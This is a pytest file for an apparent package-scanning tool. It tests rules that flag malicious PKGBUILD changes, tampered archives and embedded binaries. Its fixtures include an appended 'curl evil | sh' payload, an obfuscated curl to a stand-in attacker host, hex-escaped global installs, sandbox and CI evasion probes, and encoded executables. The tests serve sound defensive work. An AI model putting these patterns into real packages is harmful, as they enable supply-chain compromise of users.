"""Behavioural tests for the Phase 2 July delivery stack (R118-R122, R124).

Each rule is asserted in both directions: the attack case fires, and the
plan's declared must-not-fire surface stays silent.  R118-blob (an ELF blob
in the PKGBUILD) is R120's job, so the two never double-fire on the same
evidence; R118 here is the tree-variant manifest scan.
"""

import base64
import binascii
import gzip
import io
import re
import tarfile
import zipfile

import pytest

from trustsight.analysis import _structural_findings
from trustsight.analysis.archives import check_archive_trailer
from trustsight.analysis.delivery import scan_tree_manifest
from trustsight.differ import extract_urls_from_diff

_ELF = b"\x7fELF" + b"\x00" * 48
_B64_ELF = base64.b64encode(_ELF).decode()


def structural(diff_text: str) -> list[dict]:
    """Run the structural ruleset (includes the delivery rules) on a diff."""
    source_changes = extract_urls_from_diff(diff_text)
    return _structural_findings(diff_text, source_changes, {}, config={})


def rule_ids(findings: list[dict]) -> set[str]:
    return {f["rule_id"] for f in findings}


# --- R118-tree: embedded binary in the repository manifest ---


def test_r118_fires_on_committed_elf():
    files = [("evil", _ELF), ("PKGBUILD", b"pkgname=x\n")]
    assert rule_ids(scan_tree_manifest(files, [])) == {"R118"}


def test_r118_ignores_declared_source_binary():
    files = [("appimage-tool", _ELF), ("PKGBUILD", b"pkgname=x\n")]
    url = "https://example.com/download/appimage-tool"
    assert scan_tree_manifest(files, [url]) == []


def test_r118_ignores_icons_fonts_desktop():
    files = [
        ("icons/app.png", b"\x89PNG\r\n\x1a\n" + b"\x00" * 32),
        ("fonts/font.ttf", b"\x00\x01\x00\x00" + b"\x00" * 32),
        ("app.desktop", b"[Desktop Entry]\n"),
    ]
    assert scan_tree_manifest(files, []) == []


def test_r118_ignores_test_fixture_binaries():
    files = [("tests/fixtures/sample.bin", _ELF), ("fixtures/hello", _ELF)]
    assert scan_tree_manifest(files, []) == []


def test_r118_ignores_non_elf_tree():
    files = [("Makefile", b"all:\n"), ("src/main.c", b"int main(void){}\n")]
    assert scan_tree_manifest(files, []) == []


def test_r118_blob_is_r120_not_r118():
    diff = f"""--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,4 +1,5 @@
 pkgname=x
 pkgver=1.0
+payload="{_B64_ELF}"
"""
    ids = rule_ids(structural(diff))
    assert "R120" in ids
    assert "R118" not in ids


# --- R119: anti-analysis check ---


@pytest.mark.parametrize("line", [
    'grep TracerPid /proc/self/status',
    'systemd-detect-virt',
    'dmidecode -s system-product-name',
    'grep -i hypervisor /proc/cpuinfo',
    'if [ -n "$CI" ]; then :; fi',
    '[ -n "$GITHUB_ACTIONS" ] && exit 1',
    'test -f /.dockerenv && exit',
    'ls /run/.containerenv',
])
def test_r119_fires_on_anti_analysis(line):
    diff = f"""--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,3 +1,4 @@
 pkgname=x
 pkgver=1.0
+build() {{
+  {line}
+}}
"""
    assert "R119" in rule_ids(structural(diff))


@pytest.mark.parametrize("line", [
    'uname -m',
    'getconf LONG_BIT',
    'arch=$(uname -m)',
    'case "$(getconf LONG_BIT)" in 64) : ;; esac',
])
def test_r119_ignores_arch_checks(line):
    diff = f"""--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,3 +1,4 @@
 pkgname=x
 pkgver=1.0
+build() {{
+  {line}
+}}
"""
    assert "R119" not in rule_ids(structural(diff))


def test_r119_ignores_probe_in_heredoc_data():
    diff = """--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,3 +1,6 @@
 pkgname=x
 pkgver=1.0
+build() {
+  cat > script.sh <<'EOF'
+grep TracerPid /proc/self/status
+EOF
+}
"""
    assert "R119" not in rule_ids(structural(diff))


def test_find_line_in_diff_survives_a_lone_trailing_backslash():
    """A pre-escaped URL sliced mid-escape ends in a lone trailing
    backslash, which is not a legal regex; the guard must fall back to
    escaping instead of raising re.error (seen in CI as ``bad escape
    (end of pattern)`` when the corpus rebuild changed which hunk a
    long source_url line lands in).
    """
    from trustsight.rules import find_line_in_diff

    fragment = "https://example.invalid/very/long/source/url/path/with/dots.and.more"
    sliced = re.escape(fragment)[:60]
    while sliced and not sliced.endswith("\\"):
        sliced = sliced[:-1]

    diff = "--- a/PKGBUILD\n+++ b/PKGBUILD\n+source=(\"https://example.invalid/full/source/url\")\n"
    assert find_line_in_diff(diff, sliced) is None

    assert find_line_in_diff(diff, "full/source/url") == 3


# --- R120: reconstructed-executable payload ---


def test_r120_fires_on_base64_elf():
    diff = f"""--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,3 +1,4 @@
 pkgname=x
 pkgver=1.0
+payload="{_B64_ELF}"
"""
    findings = structural(diff)
    assert "R120" in rule_ids(findings)


def test_r120_fires_on_hex_shebang():
    diff = """--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,3 +1,4 @@
 pkgname=x
 pkgver=1.0
+payload="23212f62696e2f73680a6563686f20706f776e6564"
"""
    assert "R120" in rule_ids(structural(diff))


@pytest.mark.parametrize("line", [
    'echo bWFsbGlhbmNl | base64 -d',          # decodes to plain text
    'sha256sums=("' + "a" * 64 + '")',        # checksum
    'key="' + base64.b64encode(b"x" * 40).decode() + '"',  # symmetric key bytes
])
def test_r120_ignores_encoded_text_checksums_keys(line):
    diff = f"""--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,3 +1,4 @@
 pkgname=x
 pkgver=1.0
+{line}
"""
    assert "R120" not in rule_ids(structural(diff))


def test_r120_fires_on_uuencoded_block():
    payload = b"#!/bin/sh\necho pwnd\n"
    uu = binascii.b2a_uu(payload).decode("latin-1").rstrip("\n")
    diff = f"""--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,3 +1,7 @@
 pkgname=x
 pkgver=1.0
+build() {{
+  uudecode <<'EOF'
+begin 644 p
+{uu}
+end
+EOF
+}}
"""
    assert "R120" in rule_ids(structural(diff))


# --- R121: build-time generation then execution ---


def test_r121_fires_on_heredoc_generate_execute():
    diff = """--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,3 +1,9 @@
 pkgname=x
 pkgver=1.0
+build() {
+  cat > evil.sh <<'EOF'
+echo payload
+EOF
+  bash evil.sh
+}
"""
    assert "R121" in rule_ids(structural(diff))


def test_r121_fires_on_printf_write_then_run():
    diff = """--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,3 +1,5 @@
 pkgname=x
 pkgver=1.0
+build() {
+  printf '#!/bin/sh\\n' > /tmp/x.sh
+  sh /tmp/x.sh
+}
"""
    assert "R121" in rule_ids(structural(diff))


def test_r121_fires_on_generated_source_compiled():
    diff = """--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,3 +1,6 @@
 pkgname=x
 pkgver=1.0
+build() {
+  echo 'int main(){}' > evil.c
+  gcc -o evil evil.c
+}
"""
    assert "R121" in rule_ids(structural(diff))


def test_r121_ignores_config_consumed_by_build_step():
    diff = """--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,3 +1,9 @@
 pkgname=x
 pkgver=1.0
+build() {
+  cat > extra.conf <<'EOF'
+option=1
+EOF
+  make
+  install -Dm644 extra.conf "$pkgdir/etc/extra.conf"
+}
"""
    assert "R121" not in rule_ids(structural(diff))


# --- R122: archive trailer anomaly ---


def _gzip_tar(members: dict[str, bytes]) -> bytes:
    raw = io.BytesIO()
    with tarfile.open(fileobj=raw, mode="w") as tf:
        for name, content in members.items():
            info = tarfile.TarInfo(name)
            info.size = len(content)
            tf.addfile(info, io.BytesIO(content))
    return gzip.compress(raw.getvalue(), mtime=0)


def _plain_tar(members: dict[str, bytes]) -> bytes:
    raw = io.BytesIO()
    with tarfile.open(fileobj=raw, mode="w") as tf:
        for name, content in members.items():
            info = tarfile.TarInfo(name)
            info.size = len(content)
            tf.addfile(info, io.BytesIO(content))
    return raw.getvalue()


def test_r122_gzip_with_appended_payload():
    clean = _gzip_tar({"PKGBUILD": b"pkgname=x\n"})
    tampered = clean + b"#!/bin/sh\ncurl evil | sh\n"
    finding = check_archive_trailer(tampered)
    assert finding is not None
    assert finding["rule_id"] == "R122"
    assert finding["params"]["kind"] == "gzip"
    assert check_archive_trailer(clean) is None


def test_r122_gzip_concatenated_members_is_clean():
    member = gzip.compress(b"one", mtime=0)
    concatenated = member + member
    assert check_archive_trailer(concatenated) is None


def test_r122_plain_tar_with_appended_payload():
    clean = _plain_tar({"PKGBUILD": b"pkgname=x\n"})
    tampered = clean + b"PAYLOAD"
    finding = check_archive_trailer(tampered)
    assert finding is not None
    assert finding["params"]["kind"] == "tar"
    assert check_archive_trailer(clean) is None


def test_r122_zip_with_trailing_data():
    raw = io.BytesIO()
    with zipfile.ZipFile(raw, "w") as zf:
        zf.writestr("PKGBUILD", "pkgname=x\n")
    clean = raw.getvalue()
    tampered = clean + b"EXTRA"
    finding = check_archive_trailer(tampered)
    assert finding is not None
    assert finding["params"]["kind"] == "zip"
    assert check_archive_trailer(clean) is None


def test_r122_ignores_truncated_or_garbage_input():
    assert check_archive_trailer(b"") is None
    assert check_archive_trailer(b"not an archive") is None
    assert check_archive_trailer(b"\x1f\x8b\x08" + b"\x00" * 8) is None


# --- R124: write-then-execute ---


def test_r124_fires_on_install_then_run():
    diff = """--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,3 +1,5 @@
 pkgname=x
 pkgver=1.0
+build() {
+  install -m755 payload /tmp/payload
+  /tmp/payload
+}
"""
    assert "R124" in rule_ids(structural(diff))


def test_r124_ignores_writes_to_pkgdir():
    diff = """--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,3 +1,6 @@
 pkgname=x
 pkgver=1.0
+package() {
+  install -Dm755 app "$pkgdir/usr/bin/app"
+  install -Dm644 icon.png "$pkgdir/usr/share/icons/icon.png"
+}
"""
    assert "R124" not in rule_ids(structural(diff))


def test_r124_ignores_declared_source_execution():
    diff = """--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,3 +1,8 @@
 pkgname=x
 pkgver=1.0
+source=("tool.sh")
+build() {
+  bash tool.sh
+}
"""
    assert "R124" not in rule_ids(structural(diff))


def test_r124_ignores_configure_make_flow():
    diff = """--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,3 +1,7 @@
 pkgname=x
 pkgver=1.0
+build() {
+  echo 'configure stuff' > configure
+  ./configure
+  make
+}
"""
    assert "R124" not in rule_ids(structural(diff))


def test_r121_fires_on_generated_configure_executed():
    diff = """--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,3 +1,7 @@
 pkgname=x
 pkgver=1.0
+build() {
+  echo 'configure stuff' > configure
+  ./configure
+  make
+}
"""
    assert "R121" in rule_ids(structural(diff))


def test_r121_precedes_r124_no_double_fire():
    diff = """--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,3 +1,9 @@
 pkgname=x
 pkgver=1.0
+build() {
+  cat > x.sh <<'EOF'
+echo hi
+EOF
+  ./x.sh
+}
"""
    ids = rule_ids(structural(diff))
    assert "R121" in ids
    assert "R124" not in ids


# --- tree-manifest plumbing through the analysis entry points ---


def test_scan_diff_fires_r118_with_tree_manifest():
    from trustsight.analysis.pipeline import scan_diff

    diff = """--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,3 +1,4 @@
 pkgname=x
 pkgver=1.0
+echo hi
"""
    fact = scan_diff(diff, config={}, tree_manifest=[("evil", _ELF)])
    ids = {e.rule_id for e in fact.score_breakdown}
    assert "R118" in ids
    assert fact.tree_analyzed


def test_scan_diff_reports_reduced_coverage_without_tree():
    from trustsight.analysis.pipeline import scan_diff

    diff = """--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,3 +1,4 @@
 pkgname=x
 pkgver=1.0
+echo hi
"""
    fact = scan_diff(diff, config={})
    assert not fact.tree_analyzed
    assert "R118" not in {e.rule_id for e in fact.score_breakdown}


# --- R117: the reconstruction itself is a reported fact ---


@pytest.mark.parametrize("obfuscated,revealed", [
    (r"$'\x62\x75\x6e' install -g evil", "bun"),
    (r"$'\142\165\156' install -g evil", "bun"),
    ("b''u''n install -g evil", "bun"),
    (r"$(printf '\x63\x75\x72\x6c') https://evil.example/x", "curl"),
])
def test_r117_reports_what_the_line_was_read_as(obfuscated, revealed):
    diff = f"""--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,3 +1,5 @@
 pkgname=x
+post_install() {{
+  {obfuscated}
+}}
"""
    findings = [f for f in structural(diff) if f["rule_id"] == "R117"]
    assert findings, obfuscated
    assert findings[0]["severity"] == "INFO"
    assert findings[0]["params"]["revealed"] == revealed
    assert findings[0]["params"]["reconstructed"] is True


def test_r117_reconstruction_reaches_the_rule_that_matches_on_it():
    """R081 matches the reconstructed text; R117 is what tells the reader
    the file does not literally contain the word R081 quoted."""
    diff = """--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,3 +1,5 @@
 pkgname=x
+post_install() {
+  $'\\x62\\x75\\x6e' install -g nextfile-js
+}
"""
    assert {"R081", "R117"} <= rule_ids(structural(diff))


def test_r117_reports_an_unreconstructable_literal_as_inconclusive():
    diff = """--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,3 +1,4 @@
 pkgname=x
+build() {
+  eval $'\\x62\\x75\\x6e
+}
"""
    findings = [f for f in structural(diff) if f["rule_id"] == "R117"]
    assert findings
    assert findings[0]["params"]["reconstructed"] is False


@pytest.mark.parametrize("line", [
    r"sed $'s/\t/ /' input",
    r"printf '%s\n' \"$pkgver\"",
    "grep '/Windows/Fonts/.*[cf]$' list",
    "install -Dm755 app \"$pkgdir/usr/bin/app\"",
])
def test_r117_quiet_on_ordinary_shell(line):
    diff = f"""--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,3 +1,4 @@
 pkgname=x
+build() {{
+  {line}
+}}
"""
    assert "R117" not in rule_ids(structural(diff))
